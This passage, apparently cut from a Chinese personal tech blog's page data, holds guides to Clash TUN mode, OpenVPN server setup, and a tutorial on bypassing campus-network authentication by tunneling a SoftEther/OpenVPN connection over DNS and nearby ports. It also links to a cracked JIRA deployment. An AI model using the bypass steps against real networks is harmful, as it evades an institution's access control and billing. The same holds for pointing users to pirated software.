处理，在 windows 中，tun 模式性能比 tap 模式好\n\n\n# 1. 安装tun驱动\n\n进入网站wintun，点击界面中download wintun xxx下载压缩包，然后打开cfw的home directory目录\n\n\n\n根据系统版本将对应目录中wintun.dll解压至home directory目录中。基于x64的处理器的64位操作系统请使用amd64版本，32位操作系统请使用x86版本\n\n\n\n然后在general菜单中找到service mode选项，点击manage > install\n\n\n# 2. 设置并开启cfw tun\n\n进入settings页面 > profile mixin > yaml > edit\n\n将下面的代码粘贴进去\n\nmixin: # object\n  dns:\n    enable: true\n    enhanced-mode: redir-host\n    nameserver:\n    - 119.29.29.29\n    - 223.5.5.5\n    - 223.6.6.6\n  tun:\n    enable: true\n    stack: gvisor\n    dns-hijack:\n    - 198.18.0.2:53\n    macos-auto-route: true\n    macos-auto-detect-interface: true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n修改好的配置文件应类似下图格式\n\n点击右下角保存，回到general页面，将mixin开关打开\n\n打开控制面板 > 网络和 internet > 网络和共享中心 > 左侧更改适配器设置，找到名称为clash且描述为clash tunnel的适配器，如果显示已启用，说明tap模式成功开启\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"使用OpenVPN绕过校园网认证",frontmatter:{title:"使用OpenVPN绕过校园网认证",date:"2022-04-18T00:23:40.000Z",permalink:"/pages/a6dfd3/",categories:["软件使用","vpn"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/02.%E5%85%B6%E4%BB%96/01.%E4%BD%BF%E7%94%A8OpenVPN%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81.html",relativePath:"08.软件使用/11.vpn/02.其他/01.使用OpenVPN绕过校园网认证.md",key:"v-6986f2b6",path:"/pages/a6dfd3/",headers:[{level:2,title:"预备工作",slug:"预备工作",normalizedTitle:"预备工作",charIndex:150},{level:2,title:"nslookup",slug:"nslookup",normalizedTitle:"nslookup",charIndex:375},{level:2,title:"搭建服务器",slug:"搭建服务器",normalizedTitle:"搭建服务器",charIndex:586},{level:3,title:"Linux",slug:"linux",normalizedTitle:"linux",charIndex:67},{level:4,title:"提权",slug:"提权",normalizedTitle:"提权",charIndex:941},{level:4,title:"更新软件源并安装/更新相应软件（可跳过）",slug:"更新软件源并安装-更新相应软件-可跳过",normalizedTitle:"更新软件源并安装/更新相应软件（可跳过）",charIndex:974},{level:4,title:"下载并解压，然后编译服务端",slug:"下载并解压-然后编译服务端",normalizedTitle:"下载并解压，然后编译服务端",charIndex:1039},{level:4,title:"启动",slug:"启动",normalizedTitle:"启动",charIndex:1388},{level:4,title:"放行端口",slug:"放行端口",normalizedTitle:"放行端口",charIndex:1439},{level:2,title:"Windows服务端配置",slug:"windows服务端配置",normalizedTitle:"windows服务端配置",charIndex:1491},{level:2,title:"管理服务器的客户端",slug:"管理服务器的客户端",normalizedTitle:"管理服务器的客户端",charIndex:1684},{level:3,title:"安装，设置密码，配置",slug:"安装-设置密码-配置",normalizedTitle:"安装，设置密码，配置",charIndex:1843},{level:3,title:"配置端口并生成配置文件",slug:"配置端口并生成配置文件",normalizedTitle:"配置端口并生成配置文件",charIndex:2124},{level:3,title:"创建用户",slug:"创建用户",normalizedTitle:"创建用户",charIndex:2415},{level:2,title:"客户端",slug:"客户端",normalizedTitle:"客户端",charIndex:1527}],headersStr:"预备工作 nslookup 搭建服务器 Linux 提权 更新软件源并安装/更新相应软件（可跳过） 下载并解压，然后编译服务端 启动 放行端口 Windows服务端配置 管理服务器的客户端 安装，设置密码，配置 配置端口并生成配置文件 创建用户 客户端",content:"虽然网上已经有了部分和OpenVPN绕过校园网认证的教程，但是我在这里整理了一下，希望能对你有所帮助。\n\n本教程适用于Windows和Linux系统。\n\n本文中的Linux发行版：Ubuntu Server 18.04\n\n本文中的Windows发行版：Windows Server 2019\n\n\n# 预备工作\n\n首先，你要有一台有公网的服务器，最好是拥有一个独立IP，并且可以开设1024以下的端口，因为我们主要是利用校园网的DNS查询这块。\n\n为什么需要一个自己的服务器呢？绕过到底是什么意思。\n\n绕过只能绕过校园网的验证，流量走的还得是你的服务器。\n\n如果你想直接用开流量用服务器上网的话岂不是还得多花一点流量，用校园网的话既可以用你的服务器上网，又可以节省流量。但是具体网速还得看你的服务器和校园网的速度。\n\n不推荐使用海外的服务商。\n\n\n# nslookup\n\n这一步是关键，如果这一步成功了，80%就能成功，下面的教程将适合你。\n\n首先连接上你的校园网，然后打开命令行，然后拿最好的测网络的工具：“百度”进行测试是否可行。\n\nnslookup www.baidu.com\n\n\n1\n\n\n如果返回结果类似如下，则可以利用DNS查询来绕过验证。\n\n\n\n你的返回结果不一定和我的一模一样，如果你成功查询到了www.baidu.com的服务器IP就可以下一步了。\n\n\n# 搭建服务器\n\n这里我使用腾讯云的服务器进行搭建\n\n首先，到Github上找到合适的Release\n\nhttps://github.com/SoftEtherVPN/SoftEtherVPN_Stable/releases\n\n注意选vpnserver，如我选的是softether-vpnserver-v4.34-9745-beta-2020.04.05-linux-x64-64bit.tar.gz\n\nWindows是softether-vpnserver_vpnbridge-v4.34-9745-beta-2020.04.05-windows-x86_x64-intel.exe\n\n\n# Linux\n\n如果你没有特殊需求，我推荐使用Linux进行搭建，因为操作简单。这里我使用的发行版是Ubuntu\n\n# 提权\n\nsudo su\n\n\n1\n\n\n执行完成后输入你的密码\n\n# 更新软件源并安装/更新相应软件（可跳过）\n\napt update\napt install wget make\n\n\n1\n2\n\n\n# 下载并解压，然后编译服务端\n\nwget https://github.com/SoftEtherVPN/SoftEtherVPN_Stable/releases/download/v4.34-9745-beta/softether-vpnserver-v4.34-9745-beta-2020.04.05-linux-x64-64bit.tar.gz\n\n\n1\n\n\n解压\n\ntar -zxvf softether-vpnserver-v4.34-9745-beta-2020.04.05-linux-x64-64bit.tar.gz\n\n\n1\n\n\nMake一下下，过程很快的\n\ncd vpnserver\nmake\n\n\n1\n2\n\n\n然后同意一些东西啥的，全程填入“1”就行了，这是编译成功后的图片\n\n# 启动\n\n启动也是非常简单，输入以下命令即可\n\n./vpnserver start\n\n\n1\n\n\n\n\n# 放行端口\n\n如果只是一个专门用于绕过校园网的话，直接放行全部端口就行了。这里我就不一一解释了。\n\n\n# Windows服务端配置\n\n首先，。。配置/关闭防火墙，然后下载服务端兼客户端。。。\n\n下载地址：softether-vpnserver_vpnbridge-v4.34-9745-beta-2020.04.05-windows-x86_x64-intel.exe\n\n然后***选第一个***\n\n然后***选第一个***\n\n然后***选第一个***\n\n安装就行\n\n就这么简单\n\n\n\n\n# 管理服务器的客户端\n\n这里需要用到一个客户端进行管理服务器，这个客户端也可以装成服务端，在安装时选一下就行了。这里安装管理程序\n\n\n\n下载地址：softether-vpnserver_vpnbridge-v4.34-9745-beta-2020.04.05-windows-x86_x64-intel.exe\n\n\n# 安装，设置密码，配置\n\n安装过程一路下一步\n\n\n\n安装客户端\n\n安装完成后打开，点击“新设置”。上图中我已经添加了两个了。\n\n\n\n填写你的服务器IP。端口号可以后面再改。密码可以留空，连接时可以改。\n\n设置新的管理密码\n\n第一次搭建并连接时，要求指定一个管理员密码。\n\n\n\n连接后会弹出上图界面，你可以关闭，然后还会弹出几个新的界面，关闭即可。\n\n\n\n如果你需要443端口。到这个页面时，你可以先创建一个其他端口，然后删除443端口。请不要先删除443，然后再创建新的端口。如果你已经成功的更改端口，则可以点击“关闭”然后重新编辑服务器，填入新的端口。\n\n\n# 配置端口并生成配置文件\n\n单机“OpenVPN/MS-SSTP设置”，然后填入以下端口“53, 65, 66, 67, 68”。最后点击“为OpenVPN Client生成配置样本文件”，选择一个合适的位置，保存。\n\n\n\n请将压缩包内的“vm-0-8-ubuntu_openvpn_remote_access_l3.ovpn”文件提取出，然后编辑它。\n\n找到“remote”这段，将原来的值修改成实际需要的值。\n\n如下（推荐改成域名：用你的域名A记录到服务器）：\n\n\n\n后面的67是端口，你可以改成“53, 65, 66, 67, 68”的其中一个，可能需要一个一个测试。\n\n\n# 创建用户\n\n单机“管理虚拟HUB”，“管理用户”，“新建用户”。选择合适的用户名，输入你想要的密码，创建。\n\n到这里，管理界面的操作全部完成，接下来只需要用OpenVPN客户端导入配置文件连接就行。\n\n\n# 客户端\n\n下载并安装OpenVPN客户端。。。。导入.ovpn文件。。。我觉得不必多说了吧。。。\n\n连接时键入用户名密码，然后大概像这样就连接成功了，可以试试打开其他网站了。\n\n连接成功",normalizedContent:"虽然网上已经有了部分和openvpn绕过校园网认证的教程，但是我在这里整理了一下，希望能对你有所帮助。\n\n本教程适用于windows和linux系统。\n\n本文中的linux发行版：ubuntu server 18.04\n\n本文中的windows发行版：windows server 2019\n\n\n# 预备工作\n\n首先，你要有一台有公网的服务器，最好是拥有一个独立ip，并且可以开设1024以下的端口，因为我们主要是利用校园网的dns查询这块。\n\n为什么需要一个自己的服务器呢？绕过到底是什么意思。\n\n绕过只能绕过校园网的验证，流量走的还得是你的服务器。\n\n如果你想直接用开流量用服务器上网的话岂不是还得多花一点流量，用校园网的话既可以用你的服务器上网，又可以节省流量。但是具体网速还得看你的服务器和校园网的速度。\n\n不推荐使用海外的服务商。\n\n\n# nslookup\n\n这一步是关键，如果这一步成功了，80%就能成功，下面的教程将适合你。\n\n首先连接上你的校园网，然后打开命令行，然后拿最好的测网络的工具：“百度”进行测试是否可行。\n\nnslookup www.baidu.com\n\n\n1\n\n\n如果返回结果类似如下，则可以利用dns查询来绕过验证。\n\n\n\n你的返回结果不一定和我的一模一样，如果你成功查询到了www.baidu.com的服务器ip就可以下一步了。\n\n\n# 搭建服务器\n\n这里我使用腾讯云的服务器进行搭建\n\n首先，到github上找到合适的release\n\nhttps://github.com/softethervpn/softethervpn_stable/releases\n\n注意选vpnserver，如我选的是softether-vpnserver-v4.34-9745-beta-2020.04.05-linux-x64-64bit.tar.gz\n\nwindows是softether-vpnserver_vpnbridge-v4.34-9745-beta-2020.04.05-windows-x86_x64-intel.exe\n\n\n# linux\n\n如果你没有特殊需求，我推荐使用linux进行搭建，因为操作简单。这里我使用的发行版是ubuntu\n\n# 提权\n\nsudo su\n\n\n1\n\n\n执行完成后输入你的密码\n\n# 更新软件源并安装/更新相应软件（可跳过）\n\napt update\napt install wget make\n\n\n1\n2\n\n\n# 下载并解压，然后编译服务端\n\nwget https://github.com/softethervpn/softethervpn_stable/releases/download/v4.34-9745-beta/softether-vpnserver-v4.34-9745-beta-2020.04.05-linux-x64-64bit.tar.gz\n\n\n1\n\n\n解压\n\ntar -zxvf softether-vpnserver-v4.34-9745-beta-2020.04.05-linux-x64-64bit.tar.gz\n\n\n1\n\n\nmake一下下，过程很快的\n\ncd vpnserver\nmake\n\n\n1\n2\n\n\n然后同意一些东西啥的，全程填入“1”就行了，这是编译成功后的图片\n\n# 启动\n\n启动也是非常简单，输入以下命令即可\n\n./vpnserver start\n\n\n1\n\n\n\n\n# 放行端口\n\n如果只是一个专门用于绕过校园网的话，直接放行全部端口就行了。这里我就不一一解释了。\n\n\n# windows服务端配置\n\n首先，。。配置/关闭防火墙，然后下载服务端兼客户端。。。\n\n下载地址：softether-vpnserver_vpnbridge-v4.34-9745-beta-2020.04.05-windows-x86_x64-intel.exe\n\n然后***选第一个***\n\n然后***选第一个***\n\n然后***选第一个***\n\n安装就行\n\n就这么简单\n\n\n\n\n# 管理服务器的客户端\n\n这里需要用到一个客户端进行管理服务器，这个客户端也可以装成服务端，在安装时选一下就行了。这里安装管理程序\n\n\n\n下载地址：softether-vpnserver_vpnbridge-v4.34-9745-beta-2020.04.05-windows-x86_x64-intel.exe\n\n\n# 安装，设置密码，配置\n\n安装过程一路下一步\n\n\n\n安装客户端\n\n安装完成后打开，点击“新设置”。上图中我已经添加了两个了。\n\n\n\n填写你的服务器ip。端口号可以后面再改。密码可以留空，连接时可以改。\n\n设置新的管理密码\n\n第一次搭建并连接时，要求指定一个管理员密码。\n\n\n\n连接后会弹出上图界面，你可以关闭，然后还会弹出几个新的界面，关闭即可。\n\n\n\n如果你需要443端口。到这个页面时，你可以先创建一个其他端口，然后删除443端口。请不要先删除443，然后再创建新的端口。如果你已经成功的更改端口，则可以点击“关闭”然后重新编辑服务器，填入新的端口。\n\n\n# 配置端口并生成配置文件\n\n单机“openvpn/ms-sstp设置”，然后填入以下端口“53, 65, 66, 67, 68”。最后点击“为openvpn client生成配置样本文件”，选择一个合适的位置，保存。\n\n\n\n请将压缩包内的“vm-0-8-ubuntu_openvpn_remote_access_l3.ovpn”文件提取出，然后编辑它。\n\n找到“remote”这段，将原来的值修改成实际需要的值。\n\n如下（推荐改成域名：用你的域名a记录到服务器）：\n\n\n\n后面的67是端口，你可以改成“53, 65, 66, 67, 68”的其中一个，可能需要一个一个测试。\n\n\n# 创建用户\n\n单机“管理虚拟hub”，“管理用户”，“新建用户”。选择合适的用户名，输入你想要的密码，创建。\n\n到这里，管理界面的操作全部完成，接下来只需要用openvpn客户端导入配置文件连接就行。\n\n\n# 客户端\n\n下载并安装openvpn客户端。。。。导入.ovpn文件。。。我觉得不必多说了吧。。。\n\n连接时键入用户名密码，然后大概像这样就连接成功了，可以试试打开其他网站了。\n\n连接成功",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"openvpn搭建",frontmatter:{title:"openvpn搭建",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/e6840e/",categories:["软件使用","vpn"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/02.%E5%85%B6%E4%BB%96/02.openvpn%E6%90%AD%E5%BB%BA.html",relativePath:"08.软件使用/11.vpn/02.其他/02.openvpn搭建.md",key:"v-25ec4daa",path:"/pages/e6840e/",headersStr:null,content:'> openvpn 本身支持tcp和udp两种协议 如果要使用端口映射 必须使用tcp协议\n\n\n# 1. 安装前准备\n\n# 安装openssl和lzo，lzo用于压缩通讯数据加快传输速度\napt-get install openssl libssl-dev\napt-get install lzop\n# 安装openvpn和easy-rsa\nsudo apt-get install openvpn\nsudo apt-get install easy-rsa\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. 安装及配置OpenVPN和easy-rsa\n\n# 修改vars文件 \nsudo su\ncd /usr/share/easy-rsa/ \nvim vars\n\n\n1\n2\n3\n4\n\n\n# 修改注册信息，比如公司地址、公司名称、部门名称等。\nexport KEY_COUNTRY="CN"\nexport KEY_PROVINCE="Shandong"\nexport KEY_CITY="Qingdao"\nexport KEY_ORG="MyOrganization"\nexport KEY_EMAIL="me@myhost.mydomain"\nexport KEY_OU="MyOrganizationalUnit"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 初始化环境变量\nsource vars\n \n# 清除keys目录下所有与证书相关的文件\n# 下面步骤生成的证书和密钥都在/usr/share/easy-rsa/keys目录里\n./clean-all\n \n# 生成根证书ca.crt和根密钥ca.key（一路按回车即可）\n./build-ca\n \n# 为服务端生成证书和私钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）\n./build-key-server server\n \n# 每一个登陆的VPN客户端需要有一个证书，每个证书在同一时刻只能供一个客户端连接，下面建立2份\n# 为客户端生成证书和私钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）\n./build-key client1\n./build-key client2\n \n# 创建迪菲·赫尔曼密钥，会生成dh2048.pem文件（生成过程比较慢，在此期间不要去中断它）\n./build-dh\n \n# 生成ta.key文件（防DDos攻击、UDP淹没等恶意攻击）\nopenvpn --genkey --secret keys/ta.key\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 3. 创建服务器端配置文件\n\n# 在openvpn的配置目录下新建一个keys目录\nmkdir /etc/openvpn/keys\n \n# 将需要用到的openvpn证书和密钥复制一份到刚创建好的keys目录中\ncp /usr/share/easy-rsa/keys/{ca.crt,server.{crt,key},dh2048.pem,ta.key} /etc/openvpn/keys/\n \n# 复制一份服务器端配置文件模板server.conf到/etc/openvpn/\ngzip -d /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz\ncp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/\n\n# 查看server.conf里的配置参数\ngrep \'^[^#;]\' /etc/openvpn/server.conf\n\n# 编辑server.conf\nvim /etc/openvpn/server.conf \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nport 1194\n# 改成tcp，默认使用udp，如果使用HTTP Proxy，必须使用tcp协议\nproto tcp\ndev tun # 路由模式，桥接模式用dev tap\n# 路径前面加keys，全路径为/etc/openvpn/keys/ca.crt\nca keys/ca.crt\ncert keys/server.crt\nkey keys/server.key  # This file should be kept secret\ndh keys/dh2048.pem\n# 默认虚拟局域网网段，不要和实际的局域网冲突即可\nserver 10.8.0.0 255.255.255.0 # 路由模式，桥接模式用server-bridge\nifconfig-pool-persist ipp.txt\n# 10.0.0.0/8是我这台VPN服务器所在的内网的网段，读者应该根据自身实际情况进行修改\npush "route 10.0.0.0 255.0.0.0"\n# 可以让客户端之间相互访问直接通过openvpn程序转发，根据需要设置\nclient-to-client\n# 如果客户端都使用相同的证书和密钥连接VPN，一定要打开这个选项，否则每个证书只允许一个人连接VPN\nduplicate-cn\nkeepalive 10 120\ntls-auth keys/ta.key 0 # This file is secret\ncomp-lzo\npersist-key\npersist-tun\n# OpenVPN的状态日志，默认为/etc/openvpn/openvpn-status.log\nstatus openvpn-status.log\n# OpenVPN的运行日志，默认为/etc/openvpn/openvpn.log \nlog-append openvpn.log\n# 改成verb 5可以多查看一些调试信息\nverb 5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 4. 配置内核和防火墙，启动服务\n\n# 开启路由转发功能\nsed -i \'/net.ipv4.ip_forward/s/0/1/\' /etc/sysctl.conf\nsed -i \'/net.ipv4.ip_forward/s/#//\' /etc/sysctl.conf\nsysctl -p\n \n# 配置防火墙，别忘记保存\niptables -I INPUT -p tcp --dport 1194 -m comment --comment "openvpn" -j ACCEPT\niptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j MASQUERADE\nmkdir /etc/iptables\niptables-save > /etc/iptables/iptables.conf\n# 关闭ufw防火墙，改成iptables，这一步按需要设置，比较ufw在Ubuntu默认关闭的。iptables和ufw任选一个即可。\nufw disable\n \n# 启动openvpn并设置为开机启动\nsystemctl start openvpn@server  \nsystemctl enable openvpn@server  \n# 在systemd单元文件的后面，我们通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以我们在systemd单元文件的后面添加@server来开启OpenVPN服务\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 5. 创建客户端配置文件client.ovpn（用于客户端软件使用）\n\n# 复制一份client.conf模板命名为client.ovpn\ncp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/client.ovpn  \n\n# 编辑client.ovpn\nvim /etc/openvpn/client.ovpn\n\n\n1\n2\n3\n4\n5\n\n\nclient\ndev tun # 路由模式\n# 改为tcp\nproto tcp\n# OpenVPN服务器的外网IP和端口\nremote 203.195.1.2 1194\nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nca ca.crt\n# client1的证书\ncert client1.crt\n# client1的密钥\nkey client1.key\nns-cert-type server\n# 去掉前面的注释\ntls-auth ta.key 1\ncomp-lzo\nverb 5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n 6. 配置client\n\n安装软件，可以和服务器安装的保持一致：\n\n * /etc/openvpn/client.ovpn\n * /etc/openvpn/keys/ca.crt\n * /etc/openvpn/keys/client1.crt\n * /etc/openvpn/keys/client1.key\n * /etc/openvpn/keys/ta.key\n\n将这些文件复制到windows的C:\\Users\\kehao\\OpenVPN\\config下 然后连接即可',normalizedContent:'> openvpn 本身支持tcp和udp两种协议 如果要使用端口映射 必须使用tcp协议\n\n\n# 1. 安装前准备\n\n# 安装openssl和lzo，lzo用于压缩通讯数据加快传输速度\napt-get install openssl libssl-dev\napt-get install lzop\n# 安装openvpn和easy-rsa\nsudo apt-get install openvpn\nsudo apt-get install easy-rsa\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. 安装及配置openvpn和easy-rsa\n\n# 修改vars文件 \nsudo su\ncd /usr/share/easy-rsa/ \nvim vars\n\n\n1\n2\n3\n4\n\n\n# 修改注册信息，比如公司地址、公司名称、部门名称等。\nexport key_country="cn"\nexport key_province="shandong"\nexport key_city="qingdao"\nexport key_org="myorganization"\nexport key_email="me@myhost.mydomain"\nexport key_ou="myorganizationalunit"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 初始化环境变量\nsource vars\n \n# 清除keys目录下所有与证书相关的文件\n# 下面步骤生成的证书和密钥都在/usr/share/easy-rsa/keys目录里\n./clean-all\n \n# 生成根证书ca.crt和根密钥ca.key（一路按回车即可）\n./build-ca\n \n# 为服务端生成证书和私钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）\n./build-key-server server\n \n# 每一个登陆的vpn客户端需要有一个证书，每个证书在同一时刻只能供一个客户端连接，下面建立2份\n# 为客户端生成证书和私钥（一路按回车，直到提示需要输入y/n时，输入y再按回车，一共两次）\n./build-key client1\n./build-key client2\n \n# 创建迪菲·赫尔曼密钥，会生成dh2048.pem文件（生成过程比较慢，在此期间不要去中断它）\n./build-dh\n \n# 生成ta.key文件（防ddos攻击、udp淹没等恶意攻击）\nopenvpn --genkey --secret keys/ta.key\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 3. 创建服务器端配置文件\n\n# 在openvpn的配置目录下新建一个keys目录\nmkdir /etc/openvpn/keys\n \n# 将需要用到的openvpn证书和密钥复制一份到刚创建好的keys目录中\ncp /usr/share/easy-rsa/keys/{ca.crt,server.{crt,key},dh2048.pem,ta.key} /etc/openvpn/keys/\n \n# 复制一份服务器端配置文件模板server.conf到/etc/openvpn/\ngzip -d /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz\ncp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/\n\n# 查看server.conf里的配置参数\ngrep \'^[^#;]\' /etc/openvpn/server.conf\n\n# 编辑server.conf\nvim /etc/openvpn/server.conf \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nport 1194\n# 改成tcp，默认使用udp，如果使用http proxy，必须使用tcp协议\nproto tcp\ndev tun # 路由模式，桥接模式用dev tap\n# 路径前面加keys，全路径为/etc/openvpn/keys/ca.crt\nca keys/ca.crt\ncert keys/server.crt\nkey keys/server.key  # this file should be kept secret\ndh keys/dh2048.pem\n# 默认虚拟局域网网段，不要和实际的局域网冲突即可\nserver 10.8.0.0 255.255.255.0 # 路由模式，桥接模式用server-bridge\nifconfig-pool-persist ipp.txt\n# 10.0.0.0/8是我这台vpn服务器所在的内网的网段，读者应该根据自身实际情况进行修改\npush "route 10.0.0.0 255.0.0.0"\n# 可以让客户端之间相互访问直接通过openvpn程序转发，根据需要设置\nclient-to-client\n# 如果客户端都使用相同的证书和密钥连接vpn，一定要打开这个选项，否则每个证书只允许一个人连接vpn\nduplicate-cn\nkeepalive 10 120\ntls-auth keys/ta.key 0 # this file is secret\ncomp-lzo\npersist-key\npersist-tun\n# openvpn的状态日志，默认为/etc/openvpn/openvpn-status.log\nstatus openvpn-status.log\n# openvpn的运行日志，默认为/etc/openvpn/openvpn.log \nlog-append openvpn.log\n# 改成verb 5可以多查看一些调试信息\nverb 5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 4. 配置内核和防火墙，启动服务\n\n# 开启路由转发功能\nsed -i \'/net.ipv4.ip_forward/s/0/1/\' /etc/sysctl.conf\nsed -i \'/net.ipv4.ip_forward/s/#//\' /etc/sysctl.conf\nsysctl -p\n \n# 配置防火墙，别忘记保存\niptables -i input -p tcp --dport 1194 -m comment --comment "openvpn" -j accept\niptables -t nat -a postrouting -s 10.8.0.0/24 -j masquerade\nmkdir /etc/iptables\niptables-save > /etc/iptables/iptables.conf\n# 关闭ufw防火墙，改成iptables，这一步按需要设置，比较ufw在ubuntu默认关闭的。iptables和ufw任选一个即可。\nufw disable\n \n# 启动openvpn并设置为开机启动\nsystemctl start openvpn@server  \nsystemctl enable openvpn@server  \n# 在systemd单元文件的后面，我们通过指定特定的配置文件名来作为一个实例变量来开启openvpn服务，我们的配置文件名称为/etc/openvpn/server.conf，所以我们在systemd单元文件的后面添加@server来开启openvpn服务\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 5. 创建客户端配置文件client.ovpn（用于客户端软件使用）\n\n# 复制一份client.conf模板命名为client.ovpn\ncp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/client.ovpn  \n\n# 编辑client.ovpn\nvim /etc/openvpn/client.ovpn\n\n\n1\n2\n3\n4\n5\n\n\nclient\ndev tun # 路由模式\n# 改为tcp\nproto tcp\n# openvpn服务器的外网ip和端口\nremote 203.195.1.2 1194\nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nca ca.crt\n# client1的证书\ncert client1.crt\n# client1的密钥\nkey client1.key\nns-cert-type server\n# 去掉前面的注释\ntls-auth ta.key 1\ncomp-lzo\nverb 5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n 6. 配置client\n\n安装软件，可以和服务器安装的保持一致：\n\n * /etc/openvpn/client.ovpn\n * /etc/openvpn/keys/ca.crt\n * /etc/openvpn/keys/client1.crt\n * /etc/openvpn/keys/client1.key\n * /etc/openvpn/keys/ta.key\n\n将这些文件复制到windows的c:\\users\\kehao\\openvpn\\config下 然后连接即可',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"clash tun旁路由全局代理的解决方案",frontmatter:{title:"clash tun旁路由全局代理的解决方案",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/5a694a/",categories:["软件使用","vpn","科学上网"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/11.vpn/01.%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/04.clash%20tun%E6%97%81%E8%B7%AF%E7%94%B1%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html",relativePath:"08.软件使用/11.vpn/01.科学上网/04.clash tun旁路由全局代理的解决方案.md",key:"v-4105ffb1",path:"/pages/5a694a/",headersStr:null,content:"# 1. 为什么要使用tun模式\n\nclash模式是默认使用的系统代理的方式来实现翻墙 但是很多软件是不会去使用系统代理的 还需要每次单独给软件配置代理，而在不开启代理的时候软件又不能使用了\n\n\n# 2. 使用tun模式的方法\n\nclash CFW TUN 模式",normalizedContent:"# 1. 为什么要使用tun模式\n\nclash模式是默认使用的系统代理的方式来实现翻墙 但是很多软件是不会去使用系统代理的 还需要每次单独给软件配置代理，而在不开启代理的时候软件又不能使用了\n\n\n# 2. 使用tun模式的方法\n\nclash cfw tun 模式",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Docker 部署 JIRA(破解版)",frontmatter:{title:"Docker 部署 JIRA(破解版)",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/81a244/",categories:["软件使用","安装记录"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/12.%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/01.Docker%20%E9%83%A8%E7%BD%B2%20JIRA(%E7%A0%B4%E8%A7%A3%E7%89%88)%20-%20%E4%B8%89%E5%BA%A6%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD.html",relativePath:"08.软件使用/12.安装记录/01.Docker 部署 JIRA(破解版) - 三度 - 博客园.md",key:"v-8bd3c82e",path:"/pages/81a244/",headersStr:null,content:"Docker 部署 JIRA(破解版) - 三度 - 博客园 https://www.cnblogs.com/sanduzxcvbnm/p/13808648.html",normalizedContent:"docker 部署 jira(破解版) - 三度 - 博客园 https://www.cnblogs.com/sanduzxcvbnm/p/13808648.html",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux 连接 openvpn",frontmatter:{title:"linux 连接 